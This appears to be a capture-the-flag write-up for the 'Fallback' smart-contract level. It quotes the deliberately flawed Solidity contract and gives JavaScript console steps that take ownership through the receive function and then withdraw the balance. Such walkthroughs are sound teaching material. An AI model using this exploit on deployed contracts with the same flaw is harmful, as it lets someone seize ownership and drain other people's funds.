# 01. Fallback
<sup>Difficulty 1/10</sup>

You will beat this level if

1. you claim ownership of the contract
2. you reduce its balance to 0
  
Things that might help

- How to send ether when interacting with an ABI
- How to send ether outside of the ABI
- Converting to and from wei/ether units (see help() command)
- Fallback methods

## Solution

While creating the contract, the owner get a contribution of 1000 ETH

```solidity
constructor() public {
	owner = msg.sender;
	contributions[msg.sender] = 1000 * (1 ether);
}
```	

There are two ways to get the ownership:

```solidity
// 1. Send 1000+ ETH, funding 0.0009 ETH at time
function contribute() public payable {
	require(msg.value < 0.001 ether);
	contributions[msg.sender] += msg.value;
	if(contributions[msg.sender] > contributions[owner]) {
		owner = msg.sender;
	}
}
```

Or, less tediously, send one contribution, and then exploit the fallback method:

```solidity
// 2. Exploit the fallback function
receive() external payable {
	require(msg.value > 0 && contributions[msg.sender] > 0);
	owner = msg.sender;
}
```

Fallback function is a special function available to a contract. It has following features: 

- It is called when a non-existent function is called on the contract.
- It is required to be marked external.
- It has no name.
- It has no arguments
- It can not return any thing.
- It can be defined one per contract.
- If not marked payable, it will throw exception if contract receives plain ether without data.

Solution:

```javascript
async function amIOwner() {
    const currentOwner = await contract.owner()
    return currentOwner == player
}


await contract.contribute({value: toWei('0.0001')})
await contract.sendTransaction({from: player, value: toWei('0.000001')})
await amIOwner()
// true
await contract.withdraw()
```

